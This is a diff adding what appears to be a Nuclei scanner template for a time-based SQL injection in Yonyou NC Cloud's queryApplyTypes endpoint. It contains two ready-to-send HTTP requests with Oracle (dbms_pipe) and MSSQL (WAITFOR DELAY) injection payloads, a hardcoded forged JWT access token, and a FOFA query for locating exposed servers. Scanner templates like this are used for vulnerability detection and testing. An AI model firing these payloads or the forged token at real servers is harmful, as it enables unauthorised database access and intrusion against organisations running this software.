@@ -1,0 +1,46 @@
+id: yonyou-nc-cloud-queryApplyTypes-sqli
+
+info:
+  name: 用友 NC Cloud queryApplyTypes - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,sqli,nccloud,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /ncchr/busitrip/apply/queryApplyTypes?staffId=??'%20and%204431=dbms_pipe.receive_message(chr(83)||chr(104)||chr(82)||chr(70),6)-- HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - duration >= 5  && duration<= 9
+          - status_code == 500
+          - contains(body,"NullPointerException")
+        condition: and
+        
+  - raw:
+      - |
+        @timeout: 15s
+        GET /ncchr/busitrip/apply/queryApplyTypes?staffId=11';WAITFOR%20DELAY'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+    matchers:
+      - type: dsl
+        name: mssql
+        dsl:
+          - duration >= 5  && duration <= 8
+          - status_code == 500
+          - contains(body,"NullPointerException")
+        condition: and
